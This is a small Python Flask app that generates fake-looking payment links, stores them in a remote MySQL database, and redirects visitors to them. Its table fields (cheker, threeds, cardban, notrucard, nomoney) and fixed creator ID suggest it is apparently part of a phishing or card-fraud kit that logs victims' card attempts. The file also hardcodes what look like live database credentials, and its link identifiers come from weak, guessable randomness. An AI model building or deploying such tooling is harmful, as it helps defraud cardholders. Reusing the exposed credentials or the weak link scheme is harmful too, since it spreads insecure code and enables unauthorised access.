from flask import Flask, request, redirect, render_template_string
import mysql.connector
import hashlib
import random

app = Flask(__name__)

# Database connection
mydb = mysql.connector.connect(
     host="gypsy81b.beget.tech",
    user="gypsy81b_gypsy81",
    password="wdai8h3H",
    database="gypsy81b_gypsy81",
   
)
def generate_payment_link(amount):
    mydb.ping(True)
    mycursor = mydb.cursor()
    sql = "SELECT * FROM settings WHERE id = 1"
    mycursor.execute(sql)
    myresult = mycursor.fetchone()
    mycursor.close()

    result = hashlib.md5(str(random.randint(0, 800000)).encode()).hexdigest()
    linkgen = str(myresult[1]) + '/payments/' + result[0:8] + '-' + result[8:16] + '-' + result[16:24] + '-' + result[24:32]

    mycursor = mydb.cursor()
    sql = "INSERT INTO path (link,creator,method,sum,x,ip,cheker,success,nomoney,limited,error,threeds,disablepay,cardban,notrucard) VALUES (%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s,%s)"
    val = (linkgen, '6570604823', 0, amount, 2, myresult[2], 0, 0, 0, 0, 0, 0, 0, 0, 0)
    mycursor.execute(sql, val)
    mydb.commit()
    mycursor.close()

    return linkgen

@app.route('/')
def index():
    return render_template_string(open('index.html').read())

@app.route('/generate_link', methods=['POST'])
def generate_link():
    amount = request.form['amount']
    try:
        payment_link = generate_payment_link(amount)
        return redirect("http://" + payment_link)  # автоматический редирект на сгенерированную ссылку
    except Exception as e:
        return f'<h2>Error: {str(e)}</h2>'

if __name__ == '__main__':
  app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)
